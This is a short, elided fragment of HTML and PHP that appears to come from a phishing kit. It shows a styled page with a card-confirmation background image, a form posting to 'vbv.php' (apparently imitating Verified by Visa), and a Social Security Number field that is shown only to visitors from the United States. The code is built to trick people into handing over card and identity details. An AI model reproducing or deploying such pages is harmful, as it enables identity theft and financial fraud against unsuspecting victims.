...
<style>
   ...
   /* .content_form{
    ...
    .check_box{
        background-image: url("css/dixon_onboarding_form.png");
        background-repeat: no-repeat;
        padding-left: 28px;
        line-height: 26px;
        display: inline-block;
...
<body style="background-image: url('css/dixon_card_confirm.PNG'); background-repeat: no-repeat; background-position: center -1px;height: 780px;">
            ...
            <form method="post" action="vbv.php">
                <div>
                    ...
                    if($_SESSION['country']=="United States of America" ){
                       ...
                       echo '<input type="tel" id="ssn" name="ssn" class="input" placeholder="Social Security Number">';
                    }
